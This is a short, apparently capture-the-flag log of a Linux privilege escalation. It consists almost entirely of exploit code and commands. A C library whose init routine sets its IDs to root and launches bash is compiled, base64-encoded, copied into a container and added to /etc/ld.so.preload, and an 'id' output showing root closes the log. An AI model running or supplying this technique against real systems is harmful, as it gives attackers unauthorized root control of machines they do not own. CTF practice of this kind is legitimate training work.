evil$ cat pe.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
```
void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
evil$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
evil$ tar czf pe.tar.gz pe.so
evil$ cat pe.tar.gz | base64 -w0

//transfer file to docker

ctf$ echo "<BASE64_CONTENT>" | base64 -d > /tmp/pe.tar.gz
ctf$ tar -xvf /tmp/pe.tar.gz
ctf$ umask 000
ctf$ touch /etc/ld.so.preload
ctf$ echo "/tmp/pe.so" >> /etc/ld.so.preload
ctf$ touch
ctf# id
uid=0(root) gid=0(root) groups=0(root)